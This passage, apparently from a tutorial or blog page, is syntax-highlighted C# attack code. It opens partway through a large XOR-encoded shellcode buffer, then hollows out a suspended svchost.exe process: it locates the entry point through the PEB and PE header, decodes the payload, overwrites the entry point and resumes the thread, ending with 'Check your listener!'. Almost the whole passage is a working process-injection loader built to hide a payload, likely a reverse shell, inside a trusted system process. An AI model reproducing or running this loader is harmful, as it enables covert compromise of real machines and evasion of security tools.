style="color:#ff0044;font-weight:400">0x02</span>,<span style="color:#ff0044;font-weight:400">0x11</span>,<br /><span style="color:#ff0044;font-weight:400">0x30</span>,<span style="color:#ff0044;font-weight:400">0x57</span>,<span style="color:#ff0044;font-weight:400">0x07</span>,<span style="color:#ff0044;font-weight:400">0x51</span>,<span style="color:#ff0044;font-weight:400">0x50</span>,<span style="color:#ff0044;font-weight:400">0x10</span>,<span style="color:#ff0044;font-weight:400">0x10</span>,<span style="color:#ff0044;font-weight:400">0x35</span>,<span style="color:#ff0044;font-weight:400">0x08</span>,<span style="color:#ff0044;font-weight:400">0x10</span>,<span style="color:#ff0044;font-weight:400">0x51</span>,<span style="color:#ff0044;font-weight:400">0x32</span>,<br /><span style="color:#ff0044;font-weight:400">0x13</span>,<span style="color:#ff0044;font-weight:400">0x15</span>,<span style="color:#ff0044;font-weight:400">0x1b</span>,<span style="color:#ff0044;font-weight:400">0x02</span>,<span style="color:#ff0044;font-weight:400">0x4c</span>,<span style="color:#ff0044;font-weight:400">0x0b</span>,<span style="color:#ff0044;font-weight:400">0x34</span>,<span style="color:#ff0044;font-weight:400">0x4c</span>,<span style="color:#ff0044;font-weight:400">0x0b</span>,<span style="color:#ff0044;font-weight:400">0x19</span>,<span style="color:#ff0044;font-weight:400">0x0f</span>,<span style="color:#ff0044;font-weight:400">0x18</span>,<br /><span style="color:#ff0044;font-weight:400">0x17</span>,<span style="color:#ff0044;font-weight:400">0x51</span>,<span style="color:#ff0044;font-weight:400">0x05</span>,<span style="color:#ff0044;font-weight:400">0x17</span>,<span style="color:#ff0044;font-weight:400">0x05</span>,<span style="color:#ff0044;font-weight:400">0x28</span>,<span style="color:#ff0044;font-weight:400">0x09</span>,<span style="color:#ff0044;font-weight:400">0x2e</span>,<span style="color:#ff0044;font-weight:400">0x3e</span>,<span style="color:#ff0044;font-weight:400">0x3e</span>,<span style="color:#ff0044;font-weight:400">0x23</span>,<span style="color:#ff0044;font-weight:400">0x09</span>,<br /><span style="color:#ff0044;font-weight:400">0x2e</span>,<span style="color:#ff0044;font-weight:400">0x28</span>,<span style="color:#ff0044;font-weight:400">0x37</span>,<span style="color:#ff0044;font-weight:400">0x35</span>,<span style="color:#ff0044;font-weight:400">0x0c</span>,<span style="color:#ff0044;font-weight:400">0x58</span>,<span style="color:#ff0044;font-weight:400">0x16</span>,<span style="color:#ff0044;font-weight:400">0x58</span>,<span style="color:#ff0044;font-weight:400">0x38</span>,<span style="color:#ff0044;font-weight:400">0x3e</span>,<span style="color:#ff0044;font-weight:400">0x19</span>,<span style="color:#ff0044;font-weight:400">0x02</span>,<br /><span style="color:#ff0044;font-weight:400">0x10</span>,<span style="color:#ff0044;font-weight:400">0x15</span>,<span style="color:#ff0044;font-weight:400">0x13</span>,<span style="color:#ff0044;font-weight:400">0x39</span>,<span style="color:#ff0044;font-weight:400">0x10</span>,<span style="color:#ff0044;font-weight:400">0x59</span>,<span style="color:#ff0044;font-weight:400">0x36</span>,<span style="color:#ff0044;font-weight:400">0x12</span>,<span style="color:#ff0044;font-weight:400">0x0f</span>,<span style="color:#ff0044;font-weight:400">0x19</span>,<span style="color:#ff0044;font-weight:400">0x2f</span>,<span style="color:#ff0044;font-weight:400">0x30</span>,<br /><span style="color:#ff0044;font-weight:400">0x02</span>,<span style="color:#ff0044;font-weight:400">0x20</span>,<span style="color:#ff0044;font-weight:400">0x00</span>,<span style="color:#ff0044;font-weight:400">0x2c</span>,<span style="color:#ff0044;font-weight:400">0x2f</span>,<span style="color:#ff0044;font-weight:400">0x1b</span>,<span style="color:#ff0044;font-weight:400">0x29</span>,<span style="color:#ff0044;font-weight:400">0x32</span>,<span style="color:#ff0044;font-weight:400">0x05</span>,<span style="color:#ff0044;font-weight:400">0x0a</span>,<span style="color:#ff0044;font-weight:400">0x03</span>,<span style="color:#ff0044;font-weight:400">0x2f</span>,<br /><span style="color:#ff0044;font-weight:400">0x04</span>,<span style="color:#ff0044;font-weight:400">0x23</span>,<span style="color:#ff0044;font-weight:400">0x0a</span>,<span style="color:#ff0044;font-weight:400">0x53</span>,<span style="color:#ff0044;font-weight:400">0x23</span>,<span style="color:#ff0044;font-weight:400">0x36</span>,<span style="color:#ff0044;font-weight:400">0x1b</span>,<span style="color:#ff0044;font-weight:400">0x17</span>,<span style="color:#ff0044;font-weight:400">0x0d</span>,<span style="color:#ff0044;font-weight:400">0x54</span>,<span style="color:#ff0044;font-weight:400">0x0a</span>,<span style="color:#ff0044;font-weight:400">0x25</span>,<br /><span style="color:#ff0044;font-weight:400">0x57</span>,<span style="color:#ff0044;font-weight:400">0x0d</span>,<span style="color:#ff0044;font-weight:400">0x51</span>,<span style="color:#ff0044;font-weight:400">0x09</span>,<span style="color:#ff0044;font-weight:400">0x33</span>,<span style="color:#ff0044;font-weight:400">0x32</span>,<span style="color:#ff0044;font-weight:400">0x2f</span>,<span style="color:#ff0044;font-weight:400">0x09</span>,<span style="color:#ff0044;font-weight:400">0x19</span>,<span style="color:#ff0044;font-weight:400">0x54</span>,<span style="color:#ff0044;font-weight:400">0x52</span>,<span style="color:#ff0044;font-weight:400">0x26</span>,<br /><span style="color:#ff0044;font-weight:400">0x02</span>,<span style="color:#ff0044;font-weight:400">0x13</span>,<span style="color:#ff0044;font-weight:400">0x04</span>,<span style="color:#ff0044;font-weight:400">0x34</span>,<span style="color:#ff0044;font-weight:400">0x2f</span>,<span style="color:#ff0044;font-weight:400">0x19</span>,<span style="color:#ff0044;font-weight:400">0x36</span>,<span style="color:#ff0044;font-weight:400">0x06</span>,<span style="color:#ff0044;font-weight:400">0x16</span>,<span style="color:#ff0044;font-weight:400">0x33</span>,<span style="color:#ff0044;font-weight:400">0x13</span>,<span style="color:#ff0044;font-weight:400">0x0e</span>,<br /><span style="color:#ff0044;font-weight:400">0x0d</span>,<span style="color:#ff0044;font-weight:400">0x37</span>,<span style="color:#ff0044;font-weight:400">0x2c</span>,<span style="color:#ff0044;font-weight:400">0x23</span>,<span style="color:#ff0044;font-weight:400">0x32</span>,<span style="color:#ff0044;font-weight:400">0x2d</span>,<span style="color:#ff0044;font-weight:400">0x11</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x29</span>,<span style="color:#ff0044;font-weight:400">0xe8</span>,<span style="color:#ff0044;font-weight:400">0xa0</span>,<span style="color:#ff0044;font-weight:400">0x32</span>,<br /><span style="color:#ff0044;font-weight:400">0x3b</span>,<span style="color:#ff0044;font-weight:400">0x20</span>,<span style="color:#ff0044;font-weight:400">0x39</span>,<span style="color:#ff0044;font-weight:400">0x2c</span>,<span style="color:#ff0044;font-weight:400">0x50</span>,<span style="color:#ff0044;font-weight:400">0xa8</span>,<span style="color:#ff0044;font-weight:400">0x32</span>,<span style="color:#ff0044;font-weight:400">0x29</span>,<span style="color:#ff0044;font-weight:400">0xd9</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x53</span>,<span style="color:#ff0044;font-weight:400">0xc9</span>,<br /><span style="color:#ff0044;font-weight:400">0xe5</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x31</span>,<span style="color:#ff0044;font-weight:400">0x32</span>,<span style="color:#ff0044;font-weight:400">0x32</span>,<span style="color:#ff0044;font-weight:400">0x28</span>,<span style="color:#ff0044;font-weight:400">0xa6</span>,<span style="color:#ff0044;font-weight:400">0xa3</span>,<span style="color:#ff0044;font-weight:400">0x8a</span>,<br /><span style="color:#ff0044;font-weight:400">0x34</span>,<span style="color:#ff0044;font-weight:400">0x4f</span>,<span style="color:#ff0044;font-weight:400">0x5a</span>,<span style="color:#ff0044;font-weight:400">0x9e</span>,<span style="color:#ff0044;font-weight:400">0xb4</span>,<span style="color:#ff0044;font-weight:400">0x29</span>,<span style="color:#ff0044;font-weight:400">0xe8</span>,<span style="color:#ff0044;font-weight:400">0xa7</span>,<span style="color:#ff0044;font-weight:400">0x0b</span>,<span style="color:#ff0044;font-weight:400">0x6b</span>,<span style="color:#ff0044;font-weight:400">0x3e</span>,<span style="color:#ff0044;font-weight:400">0x29</span>,<br /><span style="color:#ff0044;font-weight:400">0xe8</span>,<span style="color:#ff0044;font-weight:400">0x90</span>,<span style="color:#ff0044;font-weight:400">0x0b</span>,<span style="color:#ff0044;font-weight:400">0x7e</span>,<span style="color:#ff0044;font-weight:400">0x3b</span>,<span style="color:#ff0044;font-weight:400">0x33</span>,<span style="color:#ff0044;font-weight:400">0x09</span>,<span style="color:#ff0044;font-weight:400">0xe1</span>,<span style="color:#ff0044;font-weight:400">0x52</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x28</span>,<br /><span style="color:#ff0044;font-weight:400">0xe8</span>,<span style="color:#ff0044;font-weight:400">0x81</span>,<span style="color:#ff0044;font-weight:400">0x0b</span>,<span style="color:#ff0044;font-weight:400">0x65</span>,<span style="color:#ff0044;font-weight:400">0x20</span>,<span style="color:#ff0044;font-weight:400">0x38</span>,<span style="color:#ff0044;font-weight:400">0x28</span>,<span style="color:#ff0044;font-weight:400">0xdb</span>,<span style="color:#ff0044;font-weight:400">0x14</span>,<span style="color:#ff0044;font-weight:400">0x27</span>,<span style="color:#ff0044;font-weight:400">0xff</span>,<span style="color:#ff0044;font-weight:400">0xe7</span>,<br /><span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x9e</span>,<span style="color:#ff0044;font-weight:400">0xb4</span>,<span style="color:#ff0044;font-weight:400">0x2c</span>,<span style="color:#ff0044;font-weight:400">0x50</span>,<span style="color:#ff0044;font-weight:400">0xa1</span>,<span style="color:#ff0044;font-weight:400">0x32</span>,<span style="color:#ff0044;font-weight:400">0x3b</span>,<span style="color:#ff0044;font-weight:400">0x29</span>,<br /><span style="color:#ff0044;font-weight:400">0xe8</span>,<span style="color:#ff0044;font-weight:400">0x90</span>,<span style="color:#ff0044;font-weight:400">0x2c</span>,<span style="color:#ff0044;font-weight:400">0x50</span>,<span style="color:#ff0044;font-weight:400">0xa8</span>,<span style="color:#ff0044;font-weight:400">0x2c</span>,<span style="color:#ff0044;font-weight:400">0x50</span>,<span style="color:#ff0044;font-weight:400">0xa8</span>,<span style="color:#ff0044;font-weight:400">0x32</span>,<span style="color:#ff0044;font-weight:400">0x32</span>,<span style="color:#ff0044;font-weight:400">0x28</span>,<span style="color:#ff0044;font-weight:400">0xa6</span>,<br /><span style="color:#ff0044;font-weight:400">0xa3</span>,<span style="color:#ff0044;font-weight:400">0x4c</span>,<span style="color:#ff0044;font-weight:400">0x67</span>,<span style="color:#ff0044;font-weight:400">0x79</span>,<span style="color:#ff0044;font-weight:400">0x1a</span>,<span style="color:#ff0044;font-weight:400">0x9e</span>,<span style="color:#ff0044;font-weight:400">0xb4</span>,<span style="color:#ff0044;font-weight:400">0xe4</span>,<span style="color:#ff0044;font-weight:400">0xa1</span>,<span style="color:#ff0044;font-weight:400">0x14</span>,<span style="color:#ff0044;font-weight:400">0x7e</span>,<span style="color:#ff0044;font-weight:400">0x29</span>,<br /><span style="color:#ff0044;font-weight:400">0xa6</span>,<span style="color:#ff0044;font-weight:400">0xa0</span>,<span style="color:#ff0044;font-weight:400">0xe9</span>,<span style="color:#ff0044;font-weight:400">0x72</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x28</span>,<span style="color:#ff0044;font-weight:400">0xdb</span>,<span style="color:#ff0044;font-weight:400">0x25</span>,<span style="color:#ff0044;font-weight:400">0x91</span>,<span style="color:#ff0044;font-weight:400">0x54</span>,<span style="color:#ff0044;font-weight:400">0x81</span>,<br /><span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x9e</span>,<span style="color:#ff0044;font-weight:400">0xb4</span>,<span style="color:#ff0044;font-weight:400">0x29</span>,<span style="color:#ff0044;font-weight:400">0x9e</span>,<span style="color:#ff0044;font-weight:400">0xae</span>,<span style="color:#ff0044;font-weight:400">0x15</span>,<span style="color:#ff0044;font-weight:400">0x63</span>,<span style="color:#ff0044;font-weight:400">0x8a</span>,<br /><span style="color:#ff0044;font-weight:400">0xcb</span>,<span style="color:#ff0044;font-weight:400">0x89</span>,<span style="color:#ff0044;font-weight:400">0x34</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x32</span>,<span style="color:#ff0044;font-weight:400">0x38</span>,<span style="color:#ff0044;font-weight:400">0x0b</span>,<span style="color:#ff0044;font-weight:400">0x21</span>,<span style="color:#ff0044;font-weight:400">0x3b</span>,<span style="color:#ff0044;font-weight:400">0x28</span>,<br /><span style="color:#ff0044;font-weight:400">0xe8</span>,<span style="color:#ff0044;font-weight:400">0xb0</span>,<span style="color:#ff0044;font-weight:400">0xa0</span>,<span style="color:#ff0044;font-weight:400">0x83</span>,<span style="color:#ff0044;font-weight:400">0x71</span>,<span style="color:#ff0044;font-weight:400">0x28</span>,<span style="color:#ff0044;font-weight:400">0xa6</span>,<span style="color:#ff0044;font-weight:400">0xa1</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x71</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<br /><span style="color:#ff0044;font-weight:400">0x28</span>,<span style="color:#ff0044;font-weight:400">0xdb</span>,<span style="color:#ff0044;font-weight:400">0x39</span>,<span style="color:#ff0044;font-weight:400">0xc5</span>,<span style="color:#ff0044;font-weight:400">0x32</span>,<span style="color:#ff0044;font-weight:400">0x84</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x9e</span>,<span style="color:#ff0044;font-weight:400">0xb4</span>,<br /><span style="color:#ff0044;font-weight:400">0x29</span>,<span style="color:#ff0044;font-weight:400">0xf2</span>,<span style="color:#ff0044;font-weight:400">0x32</span>,<span style="color:#ff0044;font-weight:400">0x32</span>,<span style="color:#ff0044;font-weight:400">0x29</span>,<span style="color:#ff0044;font-weight:400">0xe8</span>,<span style="color:#ff0044;font-weight:400">0x86</span>,<span style="color:#ff0044;font-weight:400">0x29</span>,<span style="color:#ff0044;font-weight:400">0xe8</span>,<span style="color:#ff0044;font-weight:400">0x90</span>,<span style="color:#ff0044;font-weight:400">0x29</span>,<span style="color:#ff0044;font-weight:400">0xe8</span>,<br /><span style="color:#ff0044;font-weight:400">0xbb</span>,<span style="color:#ff0044;font-weight:400">0x28</span>,<span style="color:#ff0044;font-weight:400">0xa6</span>,<span style="color:#ff0044;font-weight:400">0xa1</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x41</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x28</span>,<span style="color:#ff0044;font-weight:400">0xe8</span>,<span style="color:#ff0044;font-weight:400">0x98</span>,<span style="color:#ff0044;font-weight:400">0x28</span>,<br /><span style="color:#ff0044;font-weight:400">0xdb</span>,<span style="color:#ff0044;font-weight:400">0x73</span>,<span style="color:#ff0044;font-weight:400">0xf7</span>,<span style="color:#ff0044;font-weight:400">0xe8</span>,<span style="color:#ff0044;font-weight:400">0x83</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x9e</span>,<span style="color:#ff0044;font-weight:400">0xb4</span>,<span style="color:#ff0044;font-weight:400">0x29</span>,<br /><span style="color:#ff0044;font-weight:400">0xe2</span>,<span style="color:#ff0044;font-weight:400">0xa5</span>,<span style="color:#ff0044;font-weight:400">0x41</span>,<span style="color:#ff0044;font-weight:400">0xe4</span>,<span style="color:#ff0044;font-weight:400">0xa1</span>,<span style="color:#ff0044;font-weight:400">0x15</span>,<span style="color:#ff0044;font-weight:400">0xd3</span>,<span style="color:#ff0044;font-weight:400">0x07</span>,<span style="color:#ff0044;font-weight:400">0xea</span>,<span style="color:#ff0044;font-weight:400">0x66</span>,<span style="color:#ff0044;font-weight:400">0x29</span>,<span style="color:#ff0044;font-weight:400">0x60</span>,<br /><span style="color:#ff0044;font-weight:400">0xa2</span>,<span style="color:#ff0044;font-weight:400">0xe4</span>,<span style="color:#ff0044;font-weight:400">0xa1</span>,<span style="color:#ff0044;font-weight:400">0x14</span>,<span style="color:#ff0044;font-weight:400">0xb3</span>,<span style="color:#ff0044;font-weight:400">0x39</span>,<span style="color:#ff0044;font-weight:400">0xa2</span>,<span style="color:#ff0044;font-weight:400">0x39</span>,<span style="color:#ff0044;font-weight:400">0x0b</span>,<span style="color:#ff0044;font-weight:400">0x61</span>,<span style="color:#ff0044;font-weight:400">0x38</span>,<span style="color:#ff0044;font-weight:400">0xda</span>,<br /><span style="color:#ff0044;font-weight:400">0x81</span>,<span style="color:#ff0044;font-weight:400">0x7c</span>,<span style="color:#ff0044;font-weight:400">0x4b</span>,<span style="color:#ff0044;font-weight:400">0x6b</span>,<span style="color:#ff0044;font-weight:400">0x20</span>,<span style="color:#ff0044;font-weight:400">0xe8</span>,<span style="color:#ff0044;font-weight:400">0xbb</span>,<span style="color:#ff0044;font-weight:400">0x9e</span>,<span style="color:#ff0044;font-weight:400">0xb4</span>};<br /><br /><br />            <span style="color:#0088ff;font-weight:400">// Start &#39;svchost.exe&#39; in a suspended state</span><br />            StartupInfo sInfo = <span style="color:#ff9d00;font-weight:700">new</span> StartupInfo();<br />            ProcessInfo pInfo = <span style="color:#ff9d00;font-weight:700">new</span> ProcessInfo();<br />            <span style="color:#7f0044;font-weight:400">bool</span> cResult = CreateProcess(<span style="color:#ff0044;font-weight:700">null</span>, <span style="color:#3ad900;font-weight:400">&quot;c:\\windows\\system32\\svchost.exe&quot;</span>, IntPtr.Zero, IntPtr.Zero, <span style="color:#ff0044;font-weight:400">false</span>, CREATE_SUSPENDED, IntPtr.Zero, <span style="color:#ff0044;font-weight:700">null</span>, <span style="color:#ff9d00;font-weight:700">ref</span> sInfo, <span style="color:#ff9d00;font-weight:700">out</span> pInfo);<br />            Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;Started &#39;svchost.exe&#39; in a suspended state with PID {pInfo.ProcessId}. Success: {cResult}.&quot;</span>);<br /><br />            <span style="color:#0088ff;font-weight:400">// Get Process Environment Block (PEB) memory address of suspended process (offset 0x10 from base image)</span><br />            ProcessBasicInfo pbInfo = <span style="color:#ff9d00;font-weight:700">new</span> ProcessBasicInfo();<br />            <span style="color:#7f0044;font-weight:400">uint</span> retLen = <span style="color:#ff9d00;font-weight:700">new</span> <span style="color:#7f0044;font-weight:400">uint</span>();<br />            <span style="color:#7f0044;font-weight:400">long</span> qResult = ZwQueryInformationProcess(pInfo.hProcess, PROCESSBASICINFORMATION, <span style="color:#ff9d00;font-weight:700">ref</span> pbInfo, (<span style="color:#7f0044;font-weight:400">uint</span>)(IntPtr.Size * <span style="color:#ff0044;font-weight:400">6</span>), <span style="color:#ff9d00;font-weight:700">ref</span> retLen);<br />            IntPtr baseImageAddr = (IntPtr)((Int64)pbInfo.PebAddress + <span style="color:#ff0044;font-weight:400">0x10</span>);<br />            Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;Got process information and located PEB address of process at {&quot;</span>0x<span style="color:#3ad900;font-weight:400">&quot; + baseImageAddr.ToString(&quot;</span>x<span style="color:#3ad900;font-weight:400">&quot;)}. Success: {qResult == 0}.&quot;</span>);<br /><br />            <span style="color:#0088ff;font-weight:400">// Get entry point of the actual process executable</span><br />            <span style="color:#0088ff;font-weight:400">// This one is a bit complicated, because this address differs for each process (due to Address Space Layout Randomization (ASLR))</span><br />            <span style="color:#0088ff;font-weight:400">// From the PEB (address we got in last call), we have to do the following:</span><br />            <span style="color:#0088ff;font-weight:400">// 1. Read executable address from first 8 bytes (Int64, offset 0) of PEB and read data chunk for further processing</span><br />            <span style="color:#0088ff;font-weight:400">// 2. Read the field &#39;e_lfanew&#39;, 4 bytes at offset 0x3C from executable address to get the offset for the PE header</span><br />            <span style="color:#0088ff;font-weight:400">// 3. Take the memory at this PE header add an offset of 0x28 to get the Entrypoint Relative Virtual Address (RVA) offset</span><br />            <span style="color:#0088ff;font-weight:400">// 4. Read the value at the RVA offset address to get the offset of the executable entrypoint from the executable address</span><br />            <span style="color:#0088ff;font-weight:400">// 5. Get the absolute address of the entrypoint by adding this value to the base executable address. Success!</span><br /><br />            <span style="color:#0088ff;font-weight:400">// 1. Read executable address from first 8 bytes (Int64, offset 0) of PEB and read data chunk for further processing</span><br />            <span style="color:#7f0044;font-weight:400">byte</span>[] procAddr = <span style="color:#ff9d00;font-weight:700">new</span> <span style="color:#7f0044;font-weight:400">byte</span>[<span style="color:#ff0044;font-weight:400">0x8</span>];<br />            <span style="color:#7f0044;font-weight:400">byte</span>[] dataBuf = <span style="color:#ff9d00;font-weight:700">new</span> <span style="color:#7f0044;font-weight:400">byte</span>[<span style="color:#ff0044;font-weight:400">0x200</span>];<br />            IntPtr bytesRW = <span style="color:#ff9d00;font-weight:700">new</span> IntPtr();<br />            <span style="color:#7f0044;font-weight:400">bool</span> result = ReadProcessMemory(pInfo.hProcess, baseImageAddr, procAddr, procAddr.Length, <span style="color:#ff9d00;font-weight:700">out</span> bytesRW);<br />            IntPtr executableAddress = (IntPtr)BitConverter.ToInt64(procAddr, <span style="color:#ff0044;font-weight:400">0</span>);<br />            result = ReadProcessMemory(pInfo.hProcess, executableAddress, dataBuf, dataBuf.Length, <span style="color:#ff9d00;font-weight:700">out</span> bytesRW);<br />            Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;DEBUG: Executable base address: {&quot;</span>0x<span style="color:#3ad900;font-weight:400">&quot; + executableAddress.ToString(&quot;</span>x<span style="color:#3ad900;font-weight:400">&quot;)}.&quot;</span>);<br /><br />            <span style="color:#0088ff;font-weight:400">// 2. Read the field &#39;e_lfanew&#39;, 4 bytes (UInt32) at offset 0x3C from executable address to get the offset for the PE header</span><br />            <span style="color:#7f0044;font-weight:400">uint</span> e_lfanew = BitConverter.ToUInt32(dataBuf, <span style="color:#ff0044;font-weight:400">0x3c</span>);<br />            Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;DEBUG: e_lfanew offset: {&quot;</span>0x<span style="color:#3ad900;font-weight:400">&quot; + e_lfanew.ToString(&quot;</span>x<span style="color:#3ad900;font-weight:400">&quot;)}.&quot;</span>);<br /><br />            <span style="color:#0088ff;font-weight:400">// 3. Take the memory at this PE header add an offset of 0x28 to get the Entrypoint Relative Virtual Address (RVA) offset</span><br />            <span style="color:#7f0044;font-weight:400">uint</span> rvaOffset = e_lfanew + <span style="color:#ff0044;font-weight:400">0x28</span>;<br />            Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;DEBUG: RVA offset: {&quot;</span>0x<span style="color:#3ad900;font-weight:400">&quot; + rvaOffset.ToString(&quot;</span>x<span style="color:#3ad900;font-weight:400">&quot;)}.&quot;</span>);<br /><br />            <span style="color:#0088ff;font-weight:400">// 4. Read the 4 bytes (UInt32) at the RVA offset to get the offset of the executable entrypoint from the executable address</span><br />            <span style="color:#7f0044;font-weight:400">uint</span> rva = BitConverter.ToUInt32(dataBuf, (<span style="color:#7f0044;font-weight:400">int</span>)rvaOffset);<br />            Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;DEBUG: RVA value: {&quot;</span>0x<span style="color:#3ad900;font-weight:400">&quot; + rva.ToString(&quot;</span>x<span style="color:#3ad900;font-weight:400">&quot;)}.&quot;</span>);<br /><br />            <span style="color:#0088ff;font-weight:400">// 5. Get the absolute address of the entrypoint by adding this value to the base executable address. Success!</span><br />            IntPtr entrypointAddr = (IntPtr)((Int64)executableAddress + rva);<br />            Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;Got executable entrypoint address: {&quot;</span>0x<span style="color:#3ad900;font-weight:400">&quot; + entrypointAddr.ToString(&quot;</span>x<span style="color:#3ad900;font-weight:400">&quot;)}.&quot;</span>);<br /><br />            <span style="color:#0088ff;font-weight:400">// Carrying on, decode the XOR payload</span><br />            <span style="color:#ff9d00;font-weight:700">for</span> (<span style="color:#7f0044;font-weight:400">int</span> i = <span style="color:#ff0044;font-weight:400">0</span>; i &lt; buf.Length; i++)<br />            {<br />                buf[i] = (<span style="color:#7f0044;font-weight:400">byte</span>)(buf[i] ^ (<span style="color:#7f0044;font-weight:400">byte</span>)<span style="color:#00117f;font-weight:400">&#39;a&#39;</span>);<br />            }<br />            Console.WriteLine(<span style="color:#3ad900;font-weight:400">&quot;XOR-decoded payload.&quot;</span>);<br /><br />            <span style="color:#0088ff;font-weight:400">// Overwrite the memory at the identified address to &#39;hijack&#39; the entrypoint of the executable</span><br />            result = WriteProcessMemory(pInfo.hProcess, entrypointAddr, buf, buf.Length, <span style="color:#ff9d00;font-weight:700">out</span> bytesRW);<br />            Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;Overwrote entrypoint with payload. Success: {result}.&quot;</span>);<br /><br />            <span style="color:#0088ff;font-weight:400">// Resume the thread to trigger our payload</span><br />            <span style="color:#7f0044;font-weight:400">uint</span> rResult = ResumeThread(pInfo.hThread);<br />            Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;Triggered payload. Success: {rResult == 1}. Check your listener!&quot;</span>);<br />        }<br />    }<br />}</pre></div></p></div>
</body>
</html>
